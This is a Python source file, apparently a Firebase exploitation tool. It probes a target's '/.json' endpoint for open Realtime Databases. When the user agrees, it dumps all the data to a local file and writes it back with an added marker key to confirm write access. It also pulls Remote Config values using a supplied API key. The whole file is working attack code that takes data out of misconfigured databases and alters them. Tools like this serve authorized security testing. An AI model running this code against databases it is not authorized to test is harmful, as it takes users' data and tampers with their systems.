import requests
import json
import sys

headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"}

class Core():
    def __init__(self, url):
        self.target = url


    def is_alive(self):
        try:
            r = requests.get(self.target, headers=headers, timeout=10)
            if r.status_code == 404 or r.status_code == 500:
                print(f"[!] URL {self.target} not avaliable")
            else:
                print("[*] it's ok, trying to exploiting..")
                self.json_flaw()
        except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
            print(e)


    def json_flaw(self):
        exploit = self.target + "/.json"
        try:
            r = requests.get(exploit, headers=headers, timeout=3)
            print(f"[!] status code from {exploit} is [{r.status_code}]")
            if r.status_code == 401 or "Permission denied" in r.text or "Firebase error. Please ensure that you spelled the name of your Firebase correctly" in r.text or "has been disabled by a database owner" in r.text:
                print(f"[!] Target: {exploit} not vulnerable i got {r.status_code} status code.")
            elif r.status_code == 402 and "has exceeded its quota limit and has been temporarily disabled" in r.text:
                print(f'[!] Target is OPEN but exceeded its quota limit')
            else:
                # ugly condition.. 
                if r.status_code == 200:
                    print(f"[*] Target is vulnerable copy the URL {exploit} and verify possible leaks of sensitive information")
                    answer = input("[*] would you like to dump all data and submit again to test write permissions ?(y/N) ")

                    if answer[0].lower() == "y":
                        print(f"[->] Testing for writing permissions, dumping {exploit}")
                        data = self.dump_json(r.text)
                    else:
                        print(f"[*] verify manually {exploit}\n thanks for using firethebase!")
                        sys.exit(1)
                    try:
                        print(f"[INFO] Trying to exploit {exploit}")
                        resp = requests.put(exploit, json=data, timeout=30)
                        if "nullfil3" in resp.text:
                            print("[*] Target is exploitable!")
                            print(f"[*] Verify is the string (this firebase has weak permissions please review then) at the response here [{exploit}]")
                    except (requests.exceptions.HTTPError,requests.Timeout) as e:
                        print(f"[!] i cant upload the file :/ i got {e}")
        except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
            print(f"[!] Error while trying to connect at: {exploit}\n--> {e} ")


    def dump_json(self, json_data_text):
        fh = open('dump.json', 'w')
        fh.writelines(json_data_text)
        fh.close()

        data_text = json.loads(json_data_text)
        data_json = {"nullfil3":"this firebase has weak permissions please review them"}
        data_text.update(data_json)
        return data_text

    def remote_config(self, google_api_key, google_app_id, google_storage_bucket):
        if google_api_key == "" or google_api_key == None:
                print("=> impossible to retrive remote config, api key not found..")
                return
        else:
            strip_id = google_app_id.split(":")[1]
            url_remote_config = f"https://firebaseremoteconfig.googleapis.com/v1/projects/{strip_id}/namespaces/firebase:fetch?key={google_api_key}"
            try:
                print(f"==> get remote config.. from {url_remote_config}")
                headers = {"Content-type":"application/json"}
                r = requests.post(url_remote_config, headers=headers, json={"appId":google_app_id,"appInstanceId":"required_but_unused_value"})
                if r.status_code == 200:
                    print(f"==> Remote config response: \n\n{r.json()}")
                else:
                    print(f"[!] something went wrong, while request to remote config endpoint status_code: {r.status_code} \nData:{r.text}")
            except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
                print(f"==> Request error: {e}")
